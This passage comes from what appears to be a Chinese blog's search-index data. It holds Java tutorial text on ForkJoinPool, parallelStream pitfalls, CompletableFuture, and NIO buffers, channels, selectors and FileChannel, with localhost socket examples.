threadpoolexecutor 或者 forkjoinpool，会有什么性能的差异呢？\n首先，使用 forkjoinpool 能够使用数量有限的线程来完成非常多的具有父子关系的任务，比如使用 4 个线程来完成超过 200 万个任务。但是，使用 threadpoolexecutor 时，是不可能完成的，因为 threadpoolexecutor 中的 thread 无法选择优先执行子任务，需要完成 200 万个具有父子关系的任务时，也需要 200 万个线程，显然这是不可行的。\n\n工作窃取算法\nforkjoin 最核心的地方就是利用了现代硬件设备多核，在一个操作时候会有空闲的 cpu, 那么如何利用好这个空闲的 cpu 就成了提高性能的关键，而这里我们要提到的工作窃取（work-stealing）算法就是整个 forkjion 框架的核心理念，工作窃取（work-stealing）算法是指某个线程从其他队列里窃取任务来执行。\n\n那么为什么需要使用工作窃取算法呢？\n假如我们需要做一个比较大的任务，我们可以把这个任务分割为若干互不依赖的子任务，为了减少线程间的竞争，于是把这些子任务分别放到不同的队列里，并为每个队列创建一个单独的线程来执行队列里的任务，线程和队列一一对应，比如 a 线程负责处理 a 队列里的任务。但是有的线程会先把自己队列里的任务干完，而其他线程对应的队列里还有任务等待处理。干完活的线程与其等着，不如去帮其他线程干活，于是它就去其他线程的队列里窃取一个任务来执行。而在这时它们会访问同一个队列，所以为了减少窃取任务线程和被窃取任务线程之间的竞争，通常会使用双端队列，被窃取任务线程永远从双端队列的头部拿任务执行，而窃取任务的线程永远从双端队列的尾部拿任务执行。\n\n> 工作窃取算法的优点是充分利用线程进行并行计算，并减少了线程间的竞争，其缺点是在某些情况下还是存在竞争，比如双端队列里只有一个任务时。并且消耗了更多的系统资源，比如创建多个线程和多个双端队列。\n\n用看 forkjion 的眼光来看 parallelstreams\n上文中已经提到了在 java 8 引入了自动并行化的概念。它能够让一部分 java 代码自动地以并行的方式执行，也就是我们使用了 forkjoinpool 的 parallelstream。\n\njava 8 为 forkjoinpool 添加了一个通用线程池，这个线程池用来处理那些没有被显式提交到任何线程池的任务。它是 forkjoinpool 类型上的一个静态元素，它拥有的默认线程数量等于运行计算机上的处理器数量。当调用 arrays 类上添加的新方法时，自动并行化就会发生。比如用来排序一个数组的并行快速排序，用来对一个数组中的元素进行并行遍历。自动并行化也被运用在 java 8 新添加的 stream api 中。\n\n比如下面的代码用来遍历列表中的元素并执行需要的操作：\n\n    list<userinfo> userinfolist =\n        daocontainers.getuserinfodao().queryallbylist(new userinfomodel());\n    userinfolist.parallelstream().foreach(redisuserapi::setuseriduserinfo);\n\n\n1\n2\n3\n\n\n对于列表中的元素的操作都会以并行的方式执行。foreach 方法会为每个元素的计算操作创建一个任务，该任务会被前文中提到的 forkjoinpool 中的通用线程池处理。以上的并行计算逻辑当然也可以使用 threadpoolexecutor 完成，但是就代码的可读性和代码量而言，使用 forkjoinpool 明显更胜一筹。\n\n对于 forkjoinpool 通用线程池的线程数量，通常使用默认值就可以了，即运行时计算机的处理器数量。我这里提供了一个示例的代码让你了解 jvm 所使用的 forkjoinpool 的线程数量，你可以可以通过设置系统属性：-djava.util.concurrent.forkjoinpool.common.parallelism=n （n 为线程数量）, 来调整 forkjoinpool 的线程数量，可以尝试调整成不同的参数来观察每次的输出结果:\n\nimport java.util.arraylist;\nimport java.util.list;\nimport java.util.set;\nimport java.util.concurrent.copyonwritearrayset;\nimport java.util.concurrent.countdownlatch;\n\n/**\n * @description 这是一个用来让你更加熟悉parallelstream的原理的实力\n * @version v1.0\n */\npublic class app {\n    public static void main(string[] args) throws exception {\n        system.out.println("hello world!");\n        // 构造一个10000个元素的集合\n        list<integer> list = new arraylist<>();\n        for (int i = 0; i < 10000; i++) {\n            list.add(i);\n        }\n        // 统计并行执行list的线程\n        set<thread> threadset = new copyonwritearrayset<>();\n        // 并行执行\n        list.parallelstream().foreach(integer -> {\n            thread thread = thread.currentthread();\n            // system.out.println(thread);\n            // 统计并行执行list的线程\n            threadset.add(thread);\n        });\n        system.out.println("threadset一共有" + threadset.size() + "个线程");\n        system.out.println("系统一个有"+runtime.getruntime().availableprocessors()+"个cpu");\n        list<integer> list1 = new arraylist<>();\n        list<integer> list2 = new arraylist<>();\n        for (int i = 0; i < 100000; i++) {\n            list1.add(i);\n            list2.add(i);\n        }\n        set<thread> threadsettwo = new copyonwritearrayset<>();\n        countdownlatch countdownlatch = new countdownlatch(2);\n        thread threada = new thread(() -> {\n            list1.parallelstream().foreach(integer -> {\n                thread thread = thread.currentthread();\n                // system.out.println("list1" + thread);\n                threadsettwo.add(thread);\n            });\n            countdownlatch.countdown();\n        });\n        thread threadb = new thread(() -> {\n            list2.parallelstream().foreach(integer -> {\n                thread thread = thread.currentthread();\n                // system.out.println("list2" + thread);\n                threadsettwo.add(thread);\n            });\n            countdownlatch.countdown();\n        });\n\n        threada.start();\n        threadb.start();\n        countdownlatch.await();\n        system.out.print("threadsettwo一共有" + threadsettwo.size() + "个线程");\n\n        system.out.println("---------------------------");\n        system.out.println(threadset);\n        system.out.println(threadsettwo);\n        system.out.println("---------------------------");\n        threadsettwo.addall(threadset);\n        system.out.println(threadsettwo);\n        system.out.println("threadsettwo一共有" + threadsettwo.size() + "个线程");\n        system.out.println("系统一个有"+runtime.getruntime().availableprocessors()+"个cpu");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n出现这种现象的原因是，foreach 方法用了一些小把戏。它会将执行 foreach 本身的线程也作为线程池中的一个工作线程。因此，即使将 forkjoinpool 的通用线程池的线程数量设置为 1，实际上也会有 2 个工作线程。因此在使用 foreach 的时候，线程数为 1 的 forkjoinpool 通用线程池和线程数为 2 的 threadpoolexecutor 是等价的。\n\n所以当 forkjoinpool 通用线程池实际需要 4 个工作线程时，可以将它设置成 3，那么在运行时可用的工作线程就是 4 了。\n小结:\n\n>  1. 当需要处理递归分治算法时，考虑使用 forkjoinpool。\n>  2. 仔细设置不再进行任务划分的阈值，这个阈值对性能有影响。\n>  3. java 8 中的一些特性会使用到 forkjoinpool 中的通用线程池。在某些场合下，需要调整该线程池的默认的线程数量。\n\nparallelstreams 的陷阱\n上文中我们已经看到了 parallelstream 他强大无比的特性，但这里我们就讲告诉你 parallelstreams 不是万金油，而是一把双刃剑，如果错误的使用反倒可能伤人伤己.\n\n以下是一个我们项目里使用 parallel streams 的很常见的情况。在这个例子中，我们想同时调用不同地址的 api 中并且获得第一个返回的结果。\n\n    public static string query(string q, list<string> engines) {      optional<string> result = engines.stream().parallel().map((base) -> {\n        string url = base + q;\n        return ws.url(url).get();\n      }).findany();\n      return result.get();\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n可能有很多朋友在 jdk7 用 future 配合 countdownlatch 自己实现的这个功能，但是 jdk8 的朋友基本都会用上面的实现方式，那么自信深究一下究竟自己用 future 实现的这个功能和利用 jdk8 的 parallelstream 来实现这个功能有什么不同点呢？坑又在哪里呢？\n\n让我们细思思考一下整个功能究竟是如何运转的。首先我们的集合元素 engines 由 parallelstreams 并行的去进行 map 操作 (parallelstreams 使用 jvm 默认的 forkjoin 框架的线程池由当前线程去执行并行操作).\n\n然而，这里需要注意的一地方是我们在调用第三方的 api 请求是一个响应略慢而且会阻塞操作的一个过程。所以在某时刻所有线程都会调用 get () 方法并且在那里等待结果返回.\n\n再回过头仔细思考一下这个功能的实现过程是我们一开始想要的吗？我们是在同一时间等待所有的结果，而不是遍历这个列表按顺序等待每个回答。然而，由于 forkjoinpool workders 的存在，这样平行的等待相对于使用主线程的等待会产生的一种副作用.\n\n现在 forkjoin pool (关于 forkjion 的更多实现你可以去搜索引擎中去看一下他的具体实现方式) 的实现是：它并不会因为产生了新的 workers 而抵消掉阻塞的 workers。那么在某个时间所有 forkjoinpool.common () 的线程都会被用光。也就是说，下一次你调用这个查询方法，就可能会在一个时间与其他的 parallel stream 同时运行，而导致第二个任务的性能大大受损。或者说，例如你在这个功能里是用来快速返回调用的第三方 api 的，而在其他的功能里是用于一些简单的数据并行计算的，但是假如你先调用了这个功能，同一时间之后调用计算的函数，那么这里 forkjionpool 的实现会让你计算的函数大打折扣.\n\n不过也不要急着去吐槽 forkjoinpool 的实现，在不同的情况下你可以给它一个 managedblocker 实例并且确保它知道在一个阻塞调用中应该什么时候去抵消掉卡住的 workers. 现在有意思的一点是，在一个 parallel stream 处理中并不一定是阻塞调用会拖延程序的性能。任何被用于映射在一个集合上的长时间运行的函数都会产生同样的问题.\n\n正如我们上面那个列子的情况分析得知，lambda 的执行并不是瞬间完成的，所有使用 parallel streams 的程序都有可能成为阻塞程序的源头，并且在执行过程中程序中的其他部分将无法访问这些 workers, 这意味着任何依赖 parallel streams 的程序在什么别的东西占用着 common forkjoinpool 时将会变得不可预知并且暗藏危机.\n\n怎么正确使用 parallelstream\n如果你正在写一个其他地方都是单线程的程序并且准确地知道什么时候你应该要使用 parallel streams，这样的话你可能会觉得这个问题有一点肤浅。然而，我们很多人是在处理 web 应用、各种不同的框架以及重量级应用服务。一个服务器是怎样被设计成一个可以支持多种独立应用的主机的？谁知道呢，给你一个可以并行的却不能控制输入的 parallel stream.\n\n很抱歉，请原谅我用的标注 [怎么正确使用 parallelstream], 因为目前为止我也没有发现一个好的方式来让我真正的正确使用 parallelstream. 下面的网上写的两种方式:\n\n一种方式是限制 forkjoinpool 提供的并行数。可以通过使用 - djava.util.concurrent.forkjoinpool.common.parallelism=1 来限制线程池的大小为 1。不再从并行化中得到好处可以杜绝错误的使用它 (其实这个方式还是有点搞笑的，既然这样搞那我还不如不去使用并行流)。\n\n另一种方式就是，一个被称为工作区的可以让 forkjoinpool 平行放置的 parallelstream () 实现。不幸的是现在的 jdk 还没有实现。\n\nparallel streams 是无法预测的，而且想要正确地使用它有些棘手。几乎任何 parallel streams 的使用都会影响程序中无关部分的性能，而且是一种无法预测的方式。。但是在调用 stream.parallel () 或者 parallelstream () 时候在我的代码里之前我仍然会重新审视一遍他给我的程序究竟会带来什么问题，他能有多大的提升，是否有使用他的意义.\n\nstream or parallelstream？\n上面我们也看到了 parallelstream 所带来的隐患和好处，那么，在从 stream 和 parallelstream 方法中进行选择时，我们可以考虑以下几个问题：\n\n>  1. 是否需要并行？\n>  2. 任务之间是否是独立的？是否会引起任何竞态条件？\n>  3. 结果是否取决于任务的调用顺序？\n\n对于问题 1，在回答这个问题之前，你需要弄清楚你要解决的问题是什么，数据量有多大，计算的特点是什么？并不是所有的问题都适合使用并发程序来求解，比如当数据量不大时，顺序执行往往比并行执行更快。毕竟，准备线程池和其它相关资源也是需要时间的。但是，当任务涉及到 i/o 操作并且任务之间不互相依赖时，那么并行化就是一个不错的选择。通常而言，将这类程序并行化之后，执行速度会提升好几个等级。\n\n对于问题 2，如果任务之间是独立的，并且代码中不涉及到对同一个对象的某个状态或者某个变量的更新操作，那么就表明代码是可以被并行化的。\n\n对于问题 3，由于在并行环境中任务的执行顺序是不确定的，因此对于依赖于顺序的任务而言，并行化也许不能给出正确的结果。\n\n\n# completablefuture\n\ncompletablefuture 是一个异步编程 api，用的是 forkjoin 的线程实现，可以帮我们达到使用多核处理任务的效果。completablefuture 提供了 supplyasync 和 runasync 两个方法，supplyasync 异步完成后返回一个具体的数据，runasync 直接就是异步执行，执行完便结束了。我们来看看简单的用法：\n\n * supplyasync ().thencompose () 方法允许你对两个异步操作进行流水线，第一个操作完成时，将其结果作为参数传递给第二个操作\n * supplyasync ().thencombine () 你需要将两个完全不相干的 completablefuture 对象的结果整合起来，而且你也不希望等到第一个任务完全结束才开始第二项任务\n * supplyasync ().thenaccept () 它接收 completablefuture 执行完毕后的返回值做参数\n * supplyasync ().thenapply () 该方法会等 completablefuture 执行完第一个结果 就调用其执行.',charsets:{cjk:!0}},{title:"JAVA NIO API",frontmatter:{title:"JAVA NIO API",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/base/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/01.%E5%9F%BA%E7%A1%80/2.JAVA%20NIO%20API.html",relativePath:"00.语言/01.JAVA/01.基础/2.JAVA NIO API.md",key:"v-43985582",path:"/language/java/base/2/",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:2},{level:2,title:"Buffer",slug:"buffer",normalizedTitle:"buffer",charIndex:314},{level:2,title:"Channel",slug:"channel",normalizedTitle:"channel",charIndex:1222},{level:3,title:"server端",slug:"server端",normalizedTitle:"server 端",charIndex:1307},{level:3,title:"client端",slug:"client端",normalizedTitle:"client 端",charIndex:2057},{level:2,title:"Selector",slug:"selector",normalizedTitle:"selector",charIndex:2362},{level:3,title:"服务端代码",slug:"服务端代码",normalizedTitle:"服务端代码",charIndex:2574},{level:3,title:"客户端代码",slug:"客户端代码",normalizedTitle:"客户端代码",charIndex:5280},{level:2,title:"FileChannel",slug:"filechannel",normalizedTitle:"filechannel",charIndex:7108}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"概述 Buffer Channel server端 client端 Selector 服务端代码 客户端代码 FileChannel",content:'# 概述\n\nNon-Blocking I/O，是一种非阻塞通信模型。在 java.nio 式 jdk1.4 版本引入的一套 API，我们可以利用这套 API 实现非阻塞的网络编程模型。\n\n大数据和实时计算的兴起，高性能 RPC 框架与网络编程技术再次成伟焦点。比图 Fackebook 的 Thrift 框架，scala 的 Akka 框架，实时流领域的 Storm、Spark 框架，又或者开源分布式数据库的 Mycat、VoltDB，这些框架的底层通信都采用了 NIO 通信技术。而 java 领域里大名鼎鼎的 NIO 框架 ——Netty，则被众多的开源或商业软件所采用。\n\nNIO 适合高并发、高访问量、段请求\n\n\n# Buffer\n\nBuffer 缓冲区，是 NIO 通讯时数据的载体。常用的缓冲区是 ByteBuffer (字节缓冲区)。\n\n// 创建10个字节的缓冲区\nByteBuffer buffer = ByteBuffer.allocate(capacity);\n\n\n1\n2\n\n\n缓冲区的属性：\n\n * capacity (容量)：决定了存储容量的上线，一经写定，不能更改。\n * limit (限制)：限制的初始位置 = capacity\n * position (位置)：初始值是 0，但每当插入一个字节，就会向后移动一位\n\nByteBuffer 默认用的子类是 HeapByteBuffer（堆内字节缓冲区），这种类型的缓冲区，在 JVM 的堆中创建的，即缓冲区的生命周期由 (GC) JVM 管理的。MappedByteBuffer（堆外字节缓冲区），可以使用操作系统的内存，使用场景当创建大的字节缓冲区时，注意：如果使用堆外，生命周期的管理需要自来实现。\n\n缓冲区的方法：\n\n * get () 方法会根据当前 position 的位置取值，才外，get () 没调用一次，位置会移动一位。\n * buffer.limit (buffer.position ()) 获取 buffer 的 position 位置，并赋予 limit 限制\n * buffer.flip () 和 buffer.limit (buffer.position ()) 类似\n * ByteBuffer.wrap (”test“.getByte ()) 根据传入的字节数组创建对应大小的缓冲区，并写入数据，写完后，会自动掉用 flip () 方法\n * clear () 该方法不会清除缓冲区的数据，只会把 position 重置为 0，让后面的 (3 字节) 新数据，覆盖前面的 (6 字节) 老数据，但还有 3 字节的数据没有覆盖，可以使用 flip () 来清除掉未覆盖的老数据。\n * hasRemaining () 判断 limit 和 position 之间是否还有元素可读，有返回 true，无返回 false\n\n\n# Channel\n\nChannel 是通道，就像告诉公路从 A 城市通往 B 城市，而 buffer 就是货车。和 socket 的连接方式差不多，具体代码如下：\n\n\n# server 端\n\n    public static void main(String[] args) throws Exception {\n        ServerSocketChannel server = ServerSocketChannel.open();\n        // 设置 socket server 为非阻塞通信\n        server.configureBlocking(false);\n        // 绑定 本地 ip和8888 做为服务器连接口\n        server.bind(new InetSocketAddress(8888));\n\n        SocketChannel sc = null;\n        // 等待接收到一个通信连接\n        while (sc == null){\n            sc = server.accept();\n        }\n        // 设置改通信连接 也为非阻塞模式\n        sc.configureBlocking(false);\n\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        // 读取写道Buffer\n        sc.read(buffer);\n        String str = new String(buffer.array());\n        System.out.println("服务收到消息："+str);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# client 端\n\n    public static void main(String[] args) throws Exception {\n        SocketChannel sock = SocketChannel.open();\n        sock.connect(new InetSocketAddress("127.0.0.1",8888));\n        ByteBuffer buffer = ByteBuffer.wrap("hellow".getBytes());\n        sock.write(buffer);\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# Selector\n\nSelector 一般称 为选择器 ，当然你也可以翻译为 多路复用器 。它是 Java NIO 核心组件中的一个，用于检查一个或多个 NIO Channel（通道）的状态是否处于可读、可写。如此可以实现单线程管理多个 channels, 也就是可以管理多个网络链接。\n使用 Selector 的好处在于： 使用更少的线程来就可以来处理通道了， 相比使用多个线程，避免了线程上下文切换带来的开销。\n\n\n# 服务端代码\n\n    public static void main(String[] args) throws Exception {\n        ServerSocketChannel server = ServerSocketChannel.open();\n        server.configureBlocking(false);\n        server.bind(new InetSocketAddress(8888));\n        // 获取多路复用选择器\n        Selector selector = Selector.open();\n        // 服务端注册 接收客户端的 监听事件\n        server.register(selector, SelectionKey.OP_ACCEPT);\n        while(true){\n            // 该方法会阻塞，直到有事件到达u，才会放心\n            selector.select();\n            // 获取所有事件的key，走到这代表有事件来了\n            Set<SelectionKey> selectionKeys = selector.selectedKeys();\n            // 准备迭代所有事件\n            Iterator<SelectionKey> selectionKeyIterable = selectionKeys.iterator();\n            while (selectionKeyIterable.hasNext()){\n                // 获取事件\n                SelectionKey selectionKey = selectionKeyIterable.next();\n                // 表示有客户连接\n                if(selectionKey.isAcceptable()){\n                    // 得到连接\n                    ServerSocketChannel serverSocketChannel = (ServerSocketChannel) selectionKey.channel();\n                    // 建立和对应客户通信的通道\n                    SocketChannel socketChannel = serverSocketChannel.accept();\n                    // 谁知为非阻塞通信\n                    socketChannel.configureBlocking(false);\n                    // 注册拥有读写事件\n                    socketChannel.register(selector, SelectionKey.OP_READ|SelectionKey.OP_WRITE);\n                }\n                // 表示有数据发送到服务端,这里可以不用继续设置 configureBlocking 为非阻塞，在连接的时候通道已经标记过了\n                if(selectionKey.isReadable()){\n                    // 得到连接\n                    SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.allocateDirect(20);\n                    socketChannel.read(byteBuffer);\n                    while (byteBuffer.hasRemaining()){\n                        System.out.println("收到客户端的通信: "+new String(byteBuffer.array()));\n                    }\n                    \n                }\n                // 给客户端发送数据\n                if(selectionKey.isWritable()){\n                    SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.wrap("3333333".getBytes());\n                    // 读写时非阻塞的，为了确保读写完整性，需要加上 hasRemaining\n                    while (byteBuffer.hasRemaining()){\n                        socketChannel.write(byteBuffer);\n                    }\n                }\n                // 处理完毕移除事件，避免重复\n                selectionKeyIterable.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# 客户端代码\n\n    public static void main(String[] args) throws Exception {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(new InetSocketAddress("127.0.0.1",8888));\n        Selector selector = Selector.open();\n        socketChannel.register(selector,SelectionKey.OP_CONNECT);\n        while(true){\n            selector.select();\n            Iterator<SelectionKey> selectionKeyIterator = selector.selectedKeys().iterator();\n            while (selectionKeyIterator.hasNext()){\n                SelectionKey selectionKey = selectionKeyIterator.next();\n                if(selectionKey.isConnectable()){\n                    SocketChannel sc = (SocketChannel) selectionKey.channel();\n                    sc.register(selector,SelectionKey.OP_READ|SelectionKey.OP_WRITE);\n                }\n                if(selectionKey.isReadable()){\n                    SocketChannel sc = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.allocate(10);\n                    while (byteBuffer.hasRemaining()){\n                        System.out.println("收到服务端消息："+new String(byteBuffer.array()));\n                    } \n                }\n                if(selectionKey.isWritable()){\n                    SocketChannel sc = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.wrap("3333333".getBytes());\n                    // 读写时非阻塞的，为了确保读写完整性，需要加上 hasRemaining\n                    while (byteBuffer.hasRemaining()){\n                        sc.write(byteBuffer);\n                    }\n                }\n                selectionKeyIterator.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# FileChannel\n\n    public static void main(String[] args) throws Exception {\n        FileChannel write = new FileOutputStream(new File("1.txt")).getChannel();\n        ByteBuffer writeByteBuffer = ByteBuffer.wrap("2321312".getBytes());\n        if(writeByteBuffer.hasRemaining()) {\n            write.write(writeByteBuffer);\n        }\n        write.close();\n\n        FileChannel read = new FileInputStream(new File("1.txt")).getChannel();\n        ByteBuffer readByteBuffer = ByteBuffer.wrap("2321312".getBytes());\n        read.read(readByteBuffer);\n        if(readByteBuffer.hasRemaining()) {\n            System.out.println("文件内容："+new String(readByteBuffer.array()));\n        }\n        read.close();\n\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',normalizedContent:'# 概述\n\nnon-blocking i/o，是一种非阻塞通信模型。在 java.nio 式 jdk1.4 版本引入的一套 api，我们可以利用这套 api 实现非阻塞的网络编程模型。\n\n大数据和实时计算的兴起，高性能 rpc 框架与网络编程技术再次成伟焦点。比图 fackebook 的 thrift 框架，scala 的 akka 框架，实时流领域的 storm、spark 框架，又或者开源分布式数据库的 mycat、voltdb，这些框架的底层通信都采用了 nio 通信技术。而 java 领域里大名鼎鼎的 nio 框架 ——netty，则被众多的开源或商业软件所采用。\n\nnio 适合高并发、高访问量、段请求\n\n\n# buffer\n\nbuffer 缓冲区，是 nio 通讯时数据的载体。常用的缓冲区是 bytebuffer (字节缓冲区)。\n\n// 创建10个字节的缓冲区\nbytebuffer buffer = bytebuffer.allocate(capacity);\n\n\n1\n2\n\n\n缓冲区的属性：\n\n * capacity (容量)：决定了存储容量的上线，一经写定，不能更改。\n * limit (限制)：限制的初始位置 = capacity\n * position (位置)：初始值是 0，但每当插入一个字节，就会向后移动一位\n\nbytebuffer 默认用的子类是 heapbytebuffer（堆内字节缓冲区），这种类型的缓冲区，在 jvm 的堆中创建的，即缓冲区的生命周期由 (gc) jvm 管理的。mappedbytebuffer（堆外字节缓冲区），可以使用操作系统的内存，使用场景当创建大的字节缓冲区时，注意：如果使用堆外，生命周期的管理需要自来实现。\n\n缓冲区的方法：\n\n * get () 方法会根据当前 position 的位置取值，才外，get () 没调用一次，位置会移动一位。\n * buffer.limit (buffer.position ()) 获取 buffer 的 position 位置，并赋予 limit 限制\n * buffer.flip () 和 buffer.limit (buffer.position ()) 类似\n * bytebuffer.wrap (”test“.getbyte ()) 根据传入的字节数组创建对应大小的缓冲区，并写入数据，写完后，会自动掉用 flip () 方法\n * clear () 该方法不会清除缓冲区的数据，只会把 position 重置为 0，让后面的 (3 字节) 新数据，覆盖前面的 (6 字节) 老数据，但还有 3 字节的数据没有覆盖，可以使用 flip () 来清除掉未覆盖的老数据。\n * hasremaining () 判断 limit 和 position 之间是否还有元素可读，有返回 true，无返回 false\n\n\n# channel\n\nchannel 是通道，就像告诉公路从 a 城市通往 b 城市，而 buffer 就是货车。和 socket 的连接方式差不多，具体代码如下：\n\n\n# server 端\n\n    public static void main(string[] args) throws exception {\n        serversocketchannel server = serversocketchannel.open();\n        // 设置 socket server 为非阻塞通信\n        server.configureblocking(false);\n        // 绑定 本地 ip和8888 做为服务器连接口\n        server.bind(new inetsocketaddress(8888));\n\n        socketchannel sc = null;\n        // 等待接收到一个通信连接\n        while (sc == null){\n            sc = server.accept();\n        }\n        // 设置改通信连接 也为非阻塞模式\n        sc.configureblocking(false);\n\n        bytebuffer buffer = bytebuffer.allocate(10);\n        // 读取写道buffer\n        sc.read(buffer);\n        string str = new string(buffer.array());\n        system.out.println("服务收到消息："+str);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# client 端\n\n    public static void main(string[] args) throws exception {\n        socketchannel sock = socketchannel.open();\n        sock.connect(new inetsocketaddress("127.0.0.1",8888));\n        bytebuffer buffer = bytebuffer.wrap("hellow".getbytes());\n        sock.write(buffer);\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# selector\n\nselector 一般称 为选择器 ，当然你也可以翻译为 多路复用器 。它是 java nio 核心组件中的一个，用于检查一个或多个 nio channel（通道）的状态是否处于可读、可写。如此可以实现单线程管理多个 channels, 也就是可以管理多个网络链接。\n使用 selector 的好处在于： 使用更少的线程来就可以来处理通道了， 相比使用多个线程，避免了线程上下文切换带来的开销。\n\n\n# 服务端代码\n\n    public static void main(string[] args) throws exception {\n        serversocketchannel server = serversocketchannel.open();\n        server.configureblocking(false);\n        server.bind(new inetsocketaddress(8888));\n        // 获取多路复用选择器\n        selector selector = selector.open();\n        // 服务端注册 接收客户端的 监听事件\n        server.register(selector, selectionkey.op_accept);\n        while(true){\n            // 该方法会阻塞，直到有事件到达u，才会放心\n            selector.select();\n            // 获取所有事件的key，走到这代表有事件来了\n            set<selectionkey> selectionkeys = selector.selectedkeys();\n            // 准备迭代所有事件\n            iterator<selectionkey> selectionkeyiterable = selectionkeys.iterator();\n            while (selectionkeyiterable.hasnext()){\n                // 获取事件\n                selectionkey selectionkey = selectionkeyiterable.next();\n                // 表示有客户连接\n                if(selectionkey.isacceptable()){\n                    // 得到连接\n                    serversocketchannel serversocketchannel = (serversocketchannel) selectionkey.channel();\n                    // 建立和对应客户通信的通道\n                    socketchannel socketchannel = serversocketchannel.accept();\n                    // 谁知为非阻塞通信\n                    socketchannel.configureblocking(false);\n                    // 注册拥有读写事件\n                    socketchannel.register(selector, selectionkey.op_read|selectionkey.op_write);\n                }\n                // 表示有数据发送到服务端,这里可以不用继续设置 configureblocking 为非阻塞，在连接的时候通道已经标记过了\n                if(selectionkey.isreadable()){\n                    // 得到连接\n                    socketchannel socketchannel = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.allocatedirect(20);\n                    socketchannel.read(bytebuffer);\n                    while (bytebuffer.hasremaining()){\n                        system.out.println("收到客户端的通信: "+new string(bytebuffer.array()));\n                    }\n                    \n                }\n                // 给客户端发送数据\n                if(selectionkey.iswritable()){\n                    socketchannel socketchannel = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.wrap("3333333".getbytes());\n                    // 读写时非阻塞的，为了确保读写完整性，需要加上 hasremaining\n                    while (bytebuffer.hasremaining()){\n                        socketchannel.write(bytebuffer);\n                    }\n                }\n                // 处理完毕移除事件，避免重复\n                selectionkeyiterable.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# 客户端代码\n\n    public static void main(string[] args) throws exception {\n        socketchannel socketchannel = socketchannel.open();\n        socketchannel.configureblocking(false);\n        socketchannel.connect(new inetsocketaddress("127.0.0.1",8888));\n        selector selector = selector.open();\n        socketchannel.register(selector,selectionkey.op_connect);\n        while(true){\n            selector.select();\n            iterator<selectionkey> selectionkeyiterator = selector.selectedkeys().iterator();\n            while (selectionkeyiterator.hasnext()){\n                selectionkey selectionkey = selectionkeyiterator.next();\n                if(selectionkey.isconnectable()){\n                    socketchannel sc = (socketchannel) selectionkey.channel();\n                    sc.register(selector,selectionkey.op_read|selectionkey.op_write);\n                }\n                if(selectionkey.isreadable()){\n                    socketchannel sc = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.allocate(10);\n                    while (bytebuffer.hasremaining()){\n                        system.out.println("收到服务端消息："+new string(bytebuffer.array()));\n                    } \n                }\n                if(selectionkey.iswritable()){\n                    socketchannel sc = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.wrap("3333333".getbytes());\n                    // 读写时非阻塞的，为了确保读写完整性，需要加上 hasremaining\n                    while (bytebuffer.hasremaining()){\n                        sc.write(bytebuffer);\n                    }\n                }\n                selectionkeyiterator.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# filechannel\n\n    public static void main(string[] args) throws exception {\n        filechannel write = new fileoutputstream(new file("1.txt")).getchannel();\n        bytebuffer writebytebuffer = bytebuffer.wrap("2321312".getbytes());\n        if(writebytebuffer.hasremaining()) {\n            write.write(writebytebuffer);\n        }\n        write.close();\n\n        filechannel read = new fileinputstream(new file("1.txt")).getchannel();\n        bytebuffer readbytebuffer = bytebuffer.wrap("2321312".getbytes());\n        